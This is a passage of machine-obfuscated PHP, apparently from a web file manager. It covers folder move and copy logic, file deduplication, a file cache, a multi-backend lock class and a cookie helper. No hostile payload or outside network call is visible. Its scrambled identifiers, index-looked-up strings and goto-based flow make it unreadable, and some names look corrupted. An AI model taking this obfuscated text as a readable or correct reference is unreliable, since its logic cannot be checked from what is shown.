$ş°üÉ¢™[$ï¬¶¥¤É[660]]) { $this->removeNow($Ë´×Î­ø, !1); } $this->lockMoveEnd($Ë´×Î­ø); $this->lockWriteEnd($§ÁÙÉ½â, $£ÆçìŒ¶); $this->folderSizeReset($¯À©šË×[$ï¬¶¥¤É[192]]); $this->folderSizeReset($§ÁÙÉ½â); $Õ¡üÆ›Ó = array($¯À©šË×[$ï¬¶¥¤É[192]], $§ÁÙÉ½â); if ($¯À©šË×[$ï¬¶¥¤É[485]] == $ï¬¶¥¤É[91]) { $Õ¡üÆ›Ó[] = $Ë´×Î­ø; } $this->updateModifyTime($Õ¡üÆ›Ó); Model($ï¬¶¥¤É[633])->eventMove($Ë´×Î­ø, $¯À©šË×[$ï¬¶¥¤É[192]], $§ÁÙÉ½â); Hook::trigger($ï¬¶¥¤É[659], $æé›û§û); return $ÚÃî‰ïË; } private function _move($£ÀÈ³›ô, $–ªöÛû¤, $à¡­êèõ, &$’İ´—¤©, $±øĞìËğ = '') { $¹™ˆ³ìÚ =& $_SERVER[óÔë„ú]; $íŸÉ¦„‡ = $this->sourceInfo($£ÀÈ³›ô); $İè­°Ã÷ = $íŸÉ¦„‡[$¹™ˆ³ìÚ[485]] == $¹™ˆ³ìÚ[91]; $Ôİ“Ñ¦ = $±øĞìËğ ? $±øĞìËğ : $íŸÉ¦„‡[$¹™ˆ³ìÚ[32]]; $©°ËàŞ = $this->fileNameExistAuto($–ªöÛû¤, $íŸÉ¦„‡); $this->lockMoveStart($£ÀÈ³›ô); $this->lockWriteStart($–ªöÛû¤, $Ôİ“Ñ¦); if (!$©°ËàŞ) { return $this->_moveForce($£ÀÈ³›ô, $–ªöÛû¤, $Ôİ“Ñ¦); } $©ôğğ = $©°ËàŞ; $ÏÉí×ñä = !1; if ($İè­°Ã÷) { if ($à¡­êèõ == REPEAT_RENAME_FOLDER) { $Ôİ“Ñ¦ = $this->fileNameAuto($–ªöÛû¤, $Ôİ“Ñ¦, $à¡­êèõ, $İè­°Ã÷); $©ôğğ = $this->_moveForce($£ÀÈ³›ô, $–ªöÛû¤, $Ôİ“Ñ¦); } else { if ($à¡­êèõ == REPEAT_RENAME_FOLDER) { $à¡­êèõ = REPEAT_RENAME; } $”ë§í’û = $this->_childrenListSelect($£ÀÈ³›ô); foreach ($”ë§í’û as $èƒù¥šÆ) { $this->_move($èƒù¥šÆ[$¹™ˆ³ìÚ[193]], $©°ËàŞ, $à¡­êèõ, $’İ´—¤©); } $ÏÉí×ñä = !0; } } else { if ($à¡­êèõ == REPEAT_SKIP) { $ÏÉí×ñä = !0; } else { if ($à¡­êèõ == REPEAT_RENAME || $à¡­êèõ == REPEAT_RENAME_FOLDER) { $Ôİ“Ñ¦ = $this->fileNameAuto($–ªöÛû¤, $Ôİ“Ñ¦, $à¡­êèõ, $İè­°Ã÷); $©ôğğ = $this->_moveForce($£ÀÈ³›ô, $–ªöÛû¤, $Ôİ“Ñ¦); } else { if ($à¡­êèõ == REPEAT_REPLACE) { $¼ÄÃåĞ¯ = $this->sourceInfoCache($©°ËàŞ); $¸ÓêüŒ¹ = $this->fileHistory($¼ÄÃåĞ¯, $íŸÉ¦„‡[$¹™ˆ³ìÚ[541]], $íŸÉ¦„‡[$¹™ˆ³ìÚ[79]]); $ÏÉí×ñä = !0; if ($¸ÓêüŒ¹) { $’İ´—¤©[$¹™ˆ³ìÚ[629]][] = $íŸÉ¦„‡[$¹™ˆ³ìÚ[541]]; } } } } } if ($ÏÉí×ñä && !$’İ´—¤©[$¹™ˆ³ìÚ[660]]) { $’İ´—¤©[$¹™ˆ³ìÚ[660]] = !0; } return $©ôğğ; } private function _moveForce($©çô»œã, $ÕÕøˆˆ”, $ˆ½ˆ†´ñ) { $ÅÕ‹ø’Í =& $_SERVER[óÔë„ú]; $´¾¨ËÀÏ = $this->sourceInfo($©çô»œã); $‡Ğƒ³ÎÌ = $this->sourceInfo($ÕÕøˆˆ”); $¿ş£Ò— = $´¾¨ËÀÏ[$ÅÕ‹ø’Í[485]] == $ÅÕ‹ø’Í[91]; $ÈªĞöÓ = array($ÅÕ‹ø’Í[477] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[193]], $ÅÕ‹ø’Í[652] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[584]] . $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[193]] . $ÅÕ‹ø’Í[50], $ÅÕ‹ø’Í[648] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[190]], $ÅÕ‹ø’Í[649] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[569]], $ÅÕ‹ø’Í[651] => USER_ID, $ÅÕ‹ø’Í[494] => $ˆ½ˆ†´ñ); $ÈÁÙæËë = $´¾¨ËÀÏ[$ÅÕ‹ø’Í[190]] == SourceModel::TYPE_GROUP && $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[190]] == SourceModel::TYPE_GROUP && $´¾¨ËÀÏ[$ÅÕ‹ø’Í[569]] == $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[569]]; if (!$ÈÁÙæËë && $this->moveClearAuth) { Model($ÅÕ‹ø’Í[567])->authClear($©çô»œã); } $ˆüƒÓ­ã = $´¾¨ËÀÏ[$ÅÕ‹ø’Í[505]] == $ÅÕ‹ø’Í[91] && $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[505]] != $ÅÕ‹ø’Í[91]; if ($ˆüƒÓ­ã) { $ÈªĞöÓ[$ÅÕ‹ø’Í[504]] = 0; } if ($¿ş£Ò—) { $š¬ÕüŞ· = array($ÅÕ‹ø’Í[652] => array($ÅÕ‹ø’Í[612], $´¾¨ËÀÏ[$ÅÕ‹ø’Í[584]] . $´¾¨ËÀÏ[$ÅÕ‹ø’Í[193]] . $ÅÕ‹ø’Í[613])); $„——­¼¨ = $´¾¨ËÀÏ[$ÅÕ‹ø’Í[584]] . $´¾¨ËÀÏ[$ÅÕ‹ø’Í[193]] . $ÅÕ‹ø’Í[50]; $»®ÂäëÅ = $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[584]] . $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[193]] . $ÅÕ‹ø’Í[50] . $´¾¨ËÀÏ[$ÅÕ‹ø’Í[193]] . $ÅÕ‹ø’Í[50]; $êşéĞƒ¨ = array($ÅÕ‹ø’Í[652] => array($ÅÕ‹ø’Í[661], "\162\145\x70\154\x61\x63\145\x28\x70\x61\x72\145\x6e\x74\x4c\x65\166\x65\x6c\54\x27{$„——­¼¨}\x27\54\47{$»®ÂäëÅ}\x27\x29"), $ÅÕ‹ø’Í[648] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[190]], $ÅÕ‹ø’Í[649] => $‡Ğƒ³ÎÌ[$ÅÕ‹ø’Í[569]]); if ($ˆüƒÓ­ã) { $êşéĞƒ¨[$ÅÕ‹ø’Í[504]] = 0; } $this->where($š¬ÕüŞ·)->data($êşéĞƒ¨)->save(); } $this->where(array($ÅÕ‹ø’Í[491] => $©çô»œã))->data($ÈªĞöÓ)->save(); return $©çô»œã; } private function clearShare($¦à¡ÊÉì, $ÄıÍ‘‹¦) { $ëØ¿Íœï =& $_SERVER[óÔë„ú]; $ïÒ²à» = $this->sourceInfo($¦à¡ÊÉì); $ê¨±¦‰ø = $this->sourceInfo($ÄıÍ‘‹¦); if ($ïÒ²à»[$ëØ¿Íœï[569]] == $ê¨±¦‰ø[$ëØ¿Íœï[569]] && $ïÒ²à»[$ëØ¿Íœï[190]] == $ëØ¿Íœï[662]) { return; } $œ¥°ËŒ¨ = array($ëØ¿Íœï[584] => array($ëØ¿Íœï[612], $ïÒ²à»[$ëØ¿Íœï[584]] . $¦à¡ÊÉì . $ëØ¿Íœï[613])); $‘±·ï¾ë = $this->field($ëØ¿Íœï[491])->where($œ¥°ËŒ¨)->getField($ëØ¿Íœï[193], !0); if (!$‘±·ï¾ë) { return; } $œ¥°ËŒ¨ = array($ëØ¿Íœï[193] => array($ëØ¿Íœï[7], $‘±·ï¾ë), $ëØ¿Íœï[663] => 1); $÷€ÃÉ§‘ = Model($ëØ¿Íœï[664])->field($ëØ¿Íœï[665])->where($œ¥°ËŒ¨)->select(); if (!$÷€ÃÉ§‘) { return; } $÷€ÃÉ§‘ = array_to_keyvalue($÷€ÃÉ§‘, $ëØ¿Íœï[12], $ëØ¿Íœï[665]); $œ¥°ËŒ¨ = array($ëØ¿Íœï[665] => array($ëØ¿Íœï[7], $÷€ÃÉ§‘)); Model($ëØ¿Íœï[664])->where($œ¥°ËŒ¨)->save(array($ëØ¿Íœï[663] => 0)); Model($ëØ¿Íœï[666])->where($œ¥°ËŒ¨)->delete(); } public function copyFolderFromIO($óÇ€­‚™, $¬¦º¤Ì, $¼àˆ¬´, $şÔ´Üº, $ÈÎâ°Ò, $Õ˜¿óÏÃ = false) { $÷¶ÖÀ¼Ğ =& $_SERVER[óÔë„ú]; $ óá¶¥Õ = array($÷¶ÖÀ¼Ğ[630] => array(), $÷¶ÖÀ¼Ğ[631] => array(), $÷¶ÖÀ¼Ğ[629] => array(), $÷¶ÖÀ¼Ğ[667] => array()); $Õ¶öÄ¦µ = $Õ˜¿óÏÃ ? $Õ˜¿óÏÃ : $óÇ€­‚™->pathThis($¬¦º¤Ì); $­ó¨·‚ = $this->fileNameExist($¼àˆ¬´, $Õ¶öÄ¦µ); $¶©£Íªš = $this->mkdir($¼àˆ¬´, $Õ¶öÄ¦µ, $şÔ´Üº); if (!$­ó¨·‚ || $şÔ´Üº == REPEAT_RENAME_FOLDER) { $şÔ´Üº = !1; } if ($­ó¨·‚) { $this->_childrenAllMake($­ó¨·‚); } Hook::trigger($÷¶ÖÀ¼Ğ[668]); $this->_copyChildTo($óÇ€­‚™, $¬¦º¤Ì, $¶©£Íªš, $şÔ´Üº, $ óá¶¥Õ, $ÈÎâ°Ò); Hook::trigger($÷¶ÖÀ¼Ğ[669]); if ($¶©£Íªš) { $this->folderSizeResetChildren($¶©£Íªš); } $this->_childrenListClear(); Model($÷¶ÖÀ¼Ğ[632])->addAll($ óá¶¥Õ[$÷¶ÖÀ¼Ğ[630]], array(), !0); Model($÷¶ÖÀ¼Ğ[633])->eventCopy($¶©£Íªš); $this->saveAll($ óá¶¥Õ[$÷¶ÖÀ¼Ğ[631]]); Model($÷¶ÖÀ¼Ğ[544])->linkAdd($ óá¶¥Õ[$÷¶ÖÀ¼Ğ[629]]); Model($÷¶ÖÀ¼Ğ[544])->remove($ óá¶¥Õ[$÷¶ÖÀ¼Ğ[667]]); $this->folderSizeReset($¼àˆ¬´); $this->updateModifyTime($¼àˆ¬´); return $¶©£Íªš; } private function _copyChildTo($ıï€úÃ, $ğ‚—ô†è, $€ÖòğèÜ, $­¢•Óœ, &$‹‡ä¸ÔÍ, $çÔŸñ‹¨) { $¤Ş»›› =& $_SERVER[óÔë„ú]; $¶Ü†¥ºõ = $this->sourceInfoCache($€ÖòğèÜ); $ÊÔóĞøô = $ıï€úÃ->listPath($ğ‚—ô†è); $ÊÔóĞøô = $ÊÔóĞøô ? $ÊÔóĞøô : array($¤Ş»››[86] => array(), $¤Ş»››[85] => array()); $•°Š£À£ = array_merge($ÊÔóĞøô[$¤Ş»››[86]], $ÊÔóĞøô[$¤Ş»››[85]]); $÷­¦Êã¶ = $this->_addFiles($ıï€úÃ, $ÊÔóĞøô[$¤Ş»››[86]], $çÔŸñ‹¨); $Ê±Ó”€· = array(); foreach ($•°Š£À£ as &$ø²´ñ«) { if (isset($÷­¦Êã¶[$ø²´ñ«[$¤Ş»››[32]]])) { $ø²´ñ« = $÷­¦Êã¶[$ø²´ñ«[$¤Ş»››[32]]]; } $ø²´ñ«[$¤Ş»››[485]] = $ø²´ñ«[$¤Ş»››[33]] == $¤Ş»››[78]; $ø²´ñ«[$¤Ş»››[486]] = substr(_get($ø²´ñ«, $¤Ş»››[169], $¤Ş»››[12]), 0, 10); $ø²´ñ«[$¤Ş»››[79]] = _get($ø²´ñ«, $¤Ş»››[79], 0); $ø²´ñ«[$¤Ş»››[541]] = _get($ø²´ñ«, $¤Ş»››[541], 0); if (!isset($ø²´ñ«[$¤Ş»››[670]]) && $ø²´ñ«[$¤Ş»››[541]]) { $‹‡ä¸ÔÍ[$¤Ş»››[667]][] = $ø²´ñ«[$¤Ş»››[541]]; } if ($­¢•Óœ) { $Œ‹‚­—š = $this->fileNameExistCache($€ÖòğèÜ, $ø²´ñ«[$¤Ş»››[32]]); if ($Œ‹‚­—š) { if ($ø²´ñ«[$¤Ş»››[485]] || $­¢•Óœ == REPEAT_SKIP) { continue; } if ($­¢•Óœ == REPEAT_REPLACE) { $úÛÍ§ Ç = $this->sourceInfoCache($Œ‹‚­—š); $ŒºŸÂĞ = $this->fileHistory($úÛÍ§ Ç, $ø²´ñ«[$¤Ş»››[541]], $ø²´ñ«[$¤Ş»››[79]]); if ($ŒºŸÂĞ) { $‹‡ä¸ÔÍ[$¤Ş»››[629]][] = $ø²´ñ«[$¤Ş»››[541]]; } continue; } else { if ($­¢•Óœ == REPEAT_RENAME) { $ø²´ñ«[$¤Ş»››[32]] = $this->fileNameAutoCache($€ÖòğèÜ, $ø²´ñ«[$¤Ş»››[32]], $­¢•Óœ, !1); } } } } if (!$ø²´ñ«[$¤Ş»››[485]] && $ø²´ñ«[$¤Ş»››[541]] == 0) { continue; } if (!$ø²´ñ«[$¤Ş»››[485]] && $ø²´ñ«[$¤Ş»››[541]]) { $‹‡ä¸ÔÍ[$¤Ş»››[629]][] = $ø²´ñ«[$¤Ş»››[541]]; } $Ê±Ó”€·[] = $this->_makeItemData($ø²´ñ«, $¶Ü†¥ºõ, $ø²´ñ«[$¤Ş»››[32]]); } unset($ø²´ñ«); if (!empty($Ê±Ó”€·)) { $this->addAll($Ê±Ó”€·); $this->_childrenListSelect($€ÖòğèÜ); } $ğ”ğ™‘Ò = $this->_childrenList($€ÖòğèÜ); $ğ”ğ™‘Ò = array_to_keyvalue($ğ”ğ™‘Ò, $¤Ş»››[32]); foreach ($•°Š£À£ as $ø²´ñ«) { $úÛÍ§ Ç = $ğ”ğ™‘Ò[$ø²´ñ«[$¤Ş»››[32]]]; $ë²¥Óµ“ = $úÛÍ§ Ç[$¤Ş»››[193]]; $this->_copyApplyMeta($úÛÍ§ Ç, $‹‡ä¸ÔÍ); if ($ø²´ñ«[$¤Ş»››[33]] == $¤Ş»››[78]) { $ø²´ñ«[$¤Ş»››[87]] = $ıï€úÃ->getPathInner($ø²´ñ«[$¤Ş»››[87]]); $this->_copyChildTo($ıï€úÃ, $ø²´ñ«[$¤Ş»››[87]], $ë²¥Óµ“, $­¢•Óœ, $‹‡ä¸ÔÍ, $çÔŸñ‹¨); } } } private function _addFiles($«ı»üâÚ, $íÆøØ×“, $Îâ¶€…Ş) { $êú–‡ =& $_SERVER[óÔë„ú]; if (!$íÆøØ×“ || count($íÆøØ×“) == 0) { return array(); } $ò”ü¤ù‰ = array(); foreach ($íÆøØ×“ as &$Î¿¦öá) { Hook::trigger($êú–‡[671], $Î¿¦öá); $Î¿¦öá[$êú–‡[87]] = $«ı»üâÚ->getPathInner($Î¿¦öá[$êú–‡[87]]); $œçÖ“ = $«ı»üâÚ->hashSimple($Î¿¦öá[$êú–‡[87]]); $òÂöäå = $«ı»üâÚ->hashMd5($Î¿¦öá[$êú–‡[87]]); if (strlen($òÂöäå) > 10 && !isset($ò”ü¤ù‰[$òÂöäå])) { $ò”ü¤ù‰[$òÂöäå] = array(); } $Î¿¦öá[$êú–‡[672]] = $œçÖ“; $Î¿¦öá[$êú–‡[547]] = $òÂöäå; $ò”ü¤ù‰[$òÂöäå][] =& $Î¿¦öá; if (count($ò”ü¤ù‰[$òÂöäå]) > 1) { $Î¿¦öá[$êú–‡[670]] = !0; } Hook::trigger($êú–‡[673], $Î¿¦öá); } unset($Î¿¦öá); $¨¨Õ·àõ = array($êú–‡[547] => array($êú–‡[7], array_keys($ò”ü¤ù‰))); $±ˆ¹”÷ = Model($êú–‡[674]); $ãÉ©ĞÎ = $±ˆ¹”÷->where($¨¨Õ·àõ)->select(); $ãÉ©ĞÎ = $ãÉ©ĞÎ ? $ãÉ©ĞÎ : array(); foreach ($ãÉ©ĞÎ as $´±ğ õ¬) { if (!isset($ò”ü¤ù‰[$´±ğ õ¬[$êú–‡[547]]])) { continue; } $‚‹…æêç = $ò”ü¤ù‰[$´±ğ õ¬[$êú–‡[547]]]; foreach ($‚‹…æêç as &$Î¿¦öá) { $Î¿¦öá[$êú–‡[541]] = $´±ğ õ¬[$êú–‡[541]]; $Î¿¦öá[$êú–‡[670]] = !0; } unset($Î¿¦öá); } $Îµù…€— = array(); foreach ($íÆøØ×“ as $ÎúŒÊù˜) { Hook::trigger($êú–‡[675], $ÎúŒÊù˜); if (isset($ÎúŒÊù˜[$êú–‡[670]]) && $ÎúŒÊù˜[$êú–‡[670]]) { Hook::trigger($êú–‡[676], $ÎúŒÊù˜); continue; } $İÕÀÌï = $«ı»üâÚ->getPathInner($ÎúŒÊù˜[$êú–‡[87]]); $Øí×¥ìŞ = $±ˆ¹”÷->addFileMake($İÕÀÌï, $ÎúŒÊù˜[$êú–‡[79]], $ÎúŒÊù˜[$êú–‡[672]], $ÎúŒÊù˜[$êú–‡[547]], $ÎúŒÊù˜[$êú–‡[32]], $Îâ¶€…Ş); Hook::trigger($êú–‡[676], $ÎúŒÊù˜); if (!is_array($Øí×¥ìŞ)) { continue; } $Îµù…€—[] = $Øí×¥ìŞ; } $±ˆ¹”÷->addAll($Îµù…€—); $¨¨Õ·àõ = array($êú–‡[547] => array($êú–‡[7], array_keys($ò”ü¤ù‰))); $ãÉ©ĞÎ = $±ˆ¹”÷->where($¨¨Õ·àõ)->select(); $ãÉ©ĞÎ = $ãÉ©ĞÎ ? $ãÉ©ĞÎ : array(); foreach ($ãÉ©ĞÎ as $´±ğ õ¬) { if (!isset($ò”ü¤ù‰[$´±ğ õ¬[$êú–‡[547]]])) { continue; } $šàõü¿ =& $ò”ü¤ù‰[$´±ğ õ¬[$êú–‡[547]]]; foreach ($šàõü¿ as &$Î¿¦öá) { $Î¿¦öá[$êú–‡[541]] = $´±ğ õ¬[$êú–‡[541]]; } unset($Î¿¦öá); } $‚“ß˜ã„ = array(); foreach ($íÆøØ×“ as $› øü¯é) { $‚“ß˜ã„[$› øü¯é[$êú–‡[32]]] = $› øü¯é; } return $‚“ß˜ã„; } } define($_SERVER[óÔë„ú][677], $_SERVER[óÔë„ú][678]); $qikplyuocb = $_SERVER[óÔë„ú][679]; goto f’¦æºè“; A‰·ÌÄª: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¤÷È”ä, $Ğ¼’¶êÍ) { $üğ©ı¢« =& $_SERVER[óÔë„ú]; $this->cachePath = $¤÷È”ä[$üğ©ı¢«[87]]; $this->prefix = $üğ©ı¢«[894]; $this->cacheTime = $Ğ¼’¶êÍ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ôÊ‘İÌı) { $÷ÁÒÇ€Ø =& $_SERVER[óÔë„ú]; $ôÊ‘İÌı = str_replace(array($÷ÁÒÇ€Ø[895], $÷ÁÒÇ€Ø[100], $÷ÁÒÇ€Ø[76]), $÷ÁÒÇ€Ø[896], $ôÊ‘İÌı); return $this->cachePath . $÷ÁÒÇ€Ø[897] . $ôÊ‘İÌı . $÷ÁÒÇ€Ø[898]; } public function set($ÓØª´ãÓ, $ŸÁ êÌÌ, $Îãœ¨’ä = false) { $Îãœ¨’ä = $Îãœ¨’ä ? $Îãœ¨’ä : $this->cacheTime; $‹€¯÷Ÿá = $this->getFile($ÓØª´ãÓ); if (file_put_contents($‹€¯÷Ÿá, $this->prefix . $ŸÁ êÌÌ, LOCK_EX)) { @touch($‹€¯÷Ÿá, intval(time() + $Îãœ¨’ä)); clearstatcache(); return !0; } @unlink($‹€¯÷Ÿá); return !1; } public function get($ …¯Õë­) { $Í¹ÙñÎÔ = $this->getFile($ …¯Õë­); if (file_exists($Í¹ÙñÎÔ) && filemtime($Í¹ÙñÎÔ) < time()) { @unlink($Í¹ÙñÎÔ); return !1; } $¹©œ¦ßà = @file_get_contents($Í¹ÙñÎÔ); return substr($¹©œ¦ßà, strlen($this->prefix)); } public function remove($ëâ¹¸) { $ƒÈË’ÇÃ = $this->getFile($ëâ¹¸); return @unlink($ƒÈË’ÇÃ); } public function deleteAll() { $÷«³°· =& $_SERVER[óÔë„ú]; $Õ“•¦Ô = scandir($this->cachePath); foreach ($Õ“•¦Ô as $Î•€Ã÷ã) { $“–ïå ƒ = $this->cachePath . $Î•€Ã÷ã; if (strpos($“–ïå ƒ, $÷«³°·[898]) && strpos($“–ïå ƒ, $÷«³°·[899])) { @unlink($“–ïå ƒ); } } } public function clearTimeout() { $‚û†şß¿ =& $_SERVER[óÔë„ú]; $è´ØÜƒ = scandir($this->cachePath); foreach ($è´ØÜƒ as $×ÅÊºİÖ) { $àÊ§İßŸ = $this->cachePath . $×ÅÊºİÖ; if (strpos($àÊ§İßŸ, $‚û†şß¿[898]) && strpos($àÊ§İßŸ, $‚û†şß¿[899]) && filemtime($àÊ§İßŸ) < time()) { @unlink($àÊ§İßŸ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $À±­®ëû =& $_SERVER[óÔë„ú]; if (self::$handle) { return self::$handle; } $ü²¦Ë´ù = $GLOBALS[$À±­®ëû[6]][$À±­®ëû[425]]; self::$timeout = $ü²¦Ë´ù[$À±­®ëû[900]] ? $ü²¦Ë´ù[$À±­®ëû[900]] : 10; $­¬¸éºê = _get($GLOBALS[$À±­®ëû[6]], $À±­®ëû[901]); $Ş§ÉØ÷Ä = $ü²¦Ë´ù[$À±­®ëû[886]] ? $ü²¦Ë´ù[$À±­®ëû[886]] : $À±­®ëû[230]; if ($Ş§ÉØ÷Ä == $À±­®ëû[21] && $­¬¸éºê == $À±­®ëû[13]) { $Ş§ÉØ÷Ä = $À±­®ëû[230]; } switch ($Ş§ÉØ÷Ä) { case $À±­®ëû[889]: self::$handle = new CacheLockRedis(); break; case $À±­®ëû[890]: self::$handle = new CacheLockMemcached(); break; case $À±­®ëû[21]: self::$handle = new CacheLockDatabase(); break; case $À±­®ëû[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($À±­®ëû[902], $À±­®ëû[903]); } return self::$handle; } private static function key($ÉŠ¸ãúµ) { return $_SERVER[óÔë„ú][904] . Cache::key($ÉŠ¸ãúµ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($½¹óº«¥ = '') { self::$errorMsg = $½¹óº«¥; } public static function lockGlobal($Ğ‹åë¼¦, $¡ÀÈ÷·) { return self::lock($Ğ‹åë¼¦, $¡ÀÈ÷·, !0); } public static function lock($£íå¨¼, $ÜûÁØà¼ = false, $©ÛÏö­ = false) { $•ŞÖ†Ç¤ =& $_SERVER[óÔë„ú]; $¢áüƒ°ğ = self::init(); $ğÇ–ùõ± = self::key($£íå¨¼); $ÜûÁØà¼ = $ÜûÁØà¼ ? $ÜûÁØà¼ : self::$timeout; $Âöúºö§ = timeFloat(); $÷¼ÌÃÊ• = $¢áüƒ°ğ->lock($ğÇ–ùõ±, $ÜûÁØà¼); $ä˜ƒö’ó = timeFloat(); if (!$÷¼ÌÃÊ•) { $œÕºÊ¨ = "\154\157\143\x6b\40\145\x72\x72\157\162\x3b\x6b\145\x79\x3d{$£íå¨¼}\73\x74\x69\x6d\x65\75{$ÜûÁØà¼}\x3b" . self::$errorMsg . $•ŞÖ†Ç¤[74] . get_caller_msg(); $Ÿ¼§›ä· = LNG($•ŞÖ†Ç¤[905]) . "\x28{$ÜûÁØà¼}\x73\51\x2e" . LNG($•ŞÖ†Ç¤[906]); $Ÿ¼§›ä· .= $•ŞÖ†Ç¤[907]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ÿ¼§›ä· = $Ÿ¼§›ä· . $•ŞÖ†Ç¤[908] . self::$errorMsg; } write_log($•ŞÖ†Ç¤[909] . sprintf($•ŞÖ†Ç¤[910], timeFloat() - $Âöúºö§) . $•ŞÖ†Ç¤[911] . $œÕºÊ¨ . $•ŞÖ†Ç¤[912] . error_get_last(), $•ŞÖ†Ç¤[903]); show_json($Ÿ¼§›ä·, !1); } if (!$©ÛÏö­) { self::$lockItem[$ğÇ–ùõ±] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ô‘æú£ = number_format(timeFloat() - $ä˜ƒö’ó, 3); write_log($•ŞÖ†Ç¤[913] . $£íå¨¼ . $•ŞÖ†Ç¤[914] . $ô‘æú£, $•ŞÖ†Ç¤[903]); } return $÷¼ÌÃÊ•; } public static function lockGet($ÜÜ¡äÚö) { $¼ùîå— = self::key($ÜÜ¡äÚö); if (self::$lockItem[$¼ùîå—]) { return self::$lockItem[$¼ùîå—]; } return self::init()->lockGet($¼ùîå—); } public static function unlock($©Õ—“Ä) { $­„ó§œ =& $_SERVER[óÔë„ú]; $ì˜—·‘Œ = self::key($©Õ—“Ä); self::$lockItem[$ì˜—·‘Œ] = null; self::init()->unlock($ì˜—·‘Œ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($­„ó§œ[915] . $©Õ—“Ä, $­„ó§œ[903]); } return; } public static function unlockRuntime() { $‘°îµ =& $_SERVER[óÔë„ú]; $à¦–ó”í = self::init(); $íâµòâ¤ = !1; foreach (self::$lockItem as $ÙñŠ¬ú• => $¸Òâ±¬ó) { if (!$¸Òâ±¬ó) { continue; } $à¦–ó”í->unlock($ÙñŠ¬ú•); if (!$íâµòâ¤) { $íâµòâ¤ = !0; write_log($‘°îµ[916] . $ÙñŠ¬ú• . $‘°îµ[74] . get_caller_msg(), $‘°îµ[903]); continue; } write_log($‘°îµ[916] . $ÙñŠ¬ú•, $‘°îµ[903]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ıó´Ù›í = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‘°îµ[917] . $ıó´Ù›í . $‘°îµ[918] . ACTION, $‘°îµ[903]); } } public static function fileLock($º°ƒó·) { $ŞÃ½Òæø =& $_SERVER[óÔë„ú]; if (!$GLOBALS[$ŞÃ½Òæø[919]]) { $GLOBALS[$ŞÃ½Òæø[919]] = array(); } $GLOBALS[$ŞÃ½Òæø[919]][$º°ƒó·] = !1; $Ë¥ûè˜ = fopen(DATA_PATH . $º°ƒó· . $ŞÃ½Òæø[920], $ŞÃ½Òæø[921]); if (!$Ë¥ûè˜) { return !1; } $GLOBALS[$ŞÃ½Òæø[919]][$º°ƒó·] = $Ë¥ûè˜; if (flock($Ë¥ûè˜, LOCK_EX)) { return !0; } self::unlock($º°ƒó·); show_json($ŞÃ½Òæø[922], !1); return !1; } public static function fileUnlock($İ¬Ø¥í) { $ç÷‚–Ì =& $_SERVER[óÔë„ú]; $°€¢ñ‹¿ = $GLOBALS[$ç÷‚–Ì[919]][$İ¬Ø¥í]; if (!$°€¢ñ‹¿) { return; } $GLOBALS[$ç÷‚–Ì[919]][$İ¬Ø¥í] = !1; flock($°€¢ñ‹¿, LOCK_UN); fclose($°€¢ñ‹¿); } public static function fileUnlockAll() { $üØŠéÏé =& $_SERVER[óÔë„ú]; if (!isset($GLOBALS[$üØŠéÏé[919]]) || !$GLOBALS[$üØŠéÏé[919]]) { return; } foreach ($GLOBALS[$üØŠéÏé[919]] as $Öªô¶ôÄ => $ÖÈ’ ª®) { if (!$ÖÈ’ ª®) { continue; } $GLOBALS[$üØŠéÏé[919]][$Öªô¶ôÄ] = !1; flock($ÖÈ’ ª®, LOCK_UN); fclose($ÖÈ’ ª®); } $GLOBALS[$üØŠéÏé[919]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto eÕ¼¶¤ìÂƒ; aÆ­íˆå¡: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‚Ú‰Ó²ê = '', $§ÜÕñã· = 0) { if (is_string($‚Ú‰Ó²ê) && $‚Ú‰Ó²ê != $_SERVER[óÔë„ú][12]) { $this->prefix = $‚Ú‰Ó²ê; } if (is_numeric($§ÜÕñã·) && $§ÜÕñã· > 0) { $this->expire = $§ÜÕñã·; } } public static function getInstance() { static $·š…ÅŠè; if ($·š…ÅŠè === null) { $·š…ÅŠè = new self(); } return $·š…ÅŠè; } private static $cookieDisable = false; public static function disable($¹éà¬¤Ü) { self::$cookieDisable = $¹éà¬¤Ü; } private static $sameCookieSet = array(); public static function set($í¨Ş ‹¡, $‰û›ûà“, $îäí–¿ = 0, $®ôı¯ò = false, $€´êôæ¤ = false) { $•ïŸÀãÎ =& $_SERVER[óÔë„ú]; if (self::$cookieDisable) { return; } if (!$îäí–¿) { $îäí–¿ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$í¨Ş ‹¡]) && self::$sameCookieSet[$í¨Ş ‹¡] == $‰û›ûà“ . $îäí–¿) { return; } self::$sameCookieSet[$í¨Ş ‹¡] = $‰û›ûà“ . $îäí–¿; if (!$€´êôæ¤) { $€´êôæ¤ = str_replace(HOST, $•ïŸÀãÎ[12], APP_HOST); $€´êôæ¤ = _get($GLOBALS, $•ïŸÀãÎ[945], $€´êôæ¤); } $ôÔßŠ™Ë = $•ïŸÀãÎ[12]; setcookie($í¨Ş ‹¡, $‰û›ûà“, time() + $îäí–¿, $•ïŸÀãÎ[8] . trim($€´êôæ¤, $•ïŸÀãÎ[8]) . $ôÔßŠ™Ë, !1, !1, $®ôı¯ò); } public static function setSafe($Ï˜Šƒ÷², $ñß‰¨–, $Æ›¨…ş = 0) { 